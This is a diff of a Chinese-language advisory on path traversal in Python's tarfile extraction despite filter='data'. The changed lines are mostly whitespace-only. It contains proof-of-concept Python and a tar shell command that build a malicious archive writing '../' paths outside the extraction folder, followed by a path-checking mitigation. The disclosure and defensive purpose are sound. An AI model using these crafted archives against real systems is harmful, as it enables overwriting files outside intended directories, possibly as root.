@@ -96,15 +96,15 @@ data
 假设存在以下代码：  
   
 ```
-import tarfile
+import tarfile
 br
-with tarfile.open('archive.tar', 'r') as tar:
-    # filter="data" is the new recommended/safe default, right? (not anymore!)
-    tar.extractall(path="safe_folder", filter="data")
+with tarfile.open('archive.tar', 'r') as tar:
+    # filter="data" is the new recommended/safe default, right? (not anymore!)
+    tar.extractall(path="safe_folder", filter="data")
 ```  
   
   
-那么，精心构造的archive.tar可包含   
+那么，精心构造的archive.tar可包含   
   
 ../../outside.txt  
 类文件，会导致向父目录写入。  
@@ -113,22 +113,22 @@ with tarfile.open('archive.tar', 'r') as tar:
 复现漏洞的方式如下：  
   
 ```
-import tarfile
+import tarfile
 br
-with tarfile.open('malicious.tar', 'w') as tar:
-    import io
-    info = tarfile.TarInfo("../../outside.txt")
-    data = b"This should not be here!"
-    info.size = len(data)
-    tar.addfile(info, io.BytesIO(data))
+with tarfile.open('malicious.tar', 'w') as tar:
+    import io
+    info = tarfile.TarInfo("../../outside.txt")
+    data = b"This should not be here!"
+    info.size = len(data)
+    tar.addfile(info, io.BytesIO(data))
 ```  
   
   
 通过shell生成复现漏洞的方式如下：  
   
 ```
-echo "Evil!" > evil.txt
-tar cvf malicious.tar --transform='s/^/..\/..\/..\/../' evil.txt
+echo "Evil!" > evil.txt
+tar cvf malicious.tar --transform='s/^/..\/..\/..\/../' evil.txt
 ```  
   
   
@@ -149,8 +149,8 @@ tar cvf malicious.tar --transform='s/^/..\/..\/..\/../' evil.txt
 ：若Python脚本以root运行，后果可能是灾难性的。  
   
 - **模式普遍性**  
-：这种“解压即忘”模式存在于大量代码库，而 "data"  
- 本应是安全默认值  
+：这种“解压即忘”模式存在于大量代码库，而 "data"  
+ 本应是安全默认值  
   
   
   
@@ -165,20 +165,20 @@ tar cvf malicious.tar --transform='s/^/..\/..\/..\/../' evil.txt
 此方案至少可检测并阻止路径遍历，具体代码如下：  
   
 ```
-import os
-import tarfile
+import os
+import tarfile
 br
-def is_within_directory(directory, target):
-    abs_directory = os.path.abspath(directory)
-    abs_target = os.path.abspath(target)
-    return abs_target.startswith(abs_directory + os.sep)
+def is_within_directory(directory, target):
+    abs_directory = os.path.abspath(directory)
+    abs_target = os.path.abspath(target)
+    return abs_target.startswith(abs_directory + os.sep)
 br
-with tarfile.open('archive.tar', 'r') as tar:
-    for member in tar.getmembers():
-        member_path = os.path.join("safe_folder", member.name)
-        if not is_within_directory("safe_folder", member_path):
-            raise Exception("Attempted Path Traversal in Tar File")
-    tar.extractall("safe_folder", filter="data")
+with tarfile.open('archive.tar', 'r') as tar:
+    for member in tar.getmembers():
+        member_path = os.path.join("safe_folder", member.name)
+        if not is_within_directory("safe_folder", member_path):
+            raise Exception("Attempted Path Traversal in Tar File")
+    tar.extractall("safe_folder", filter="data")
 ```  
   
   
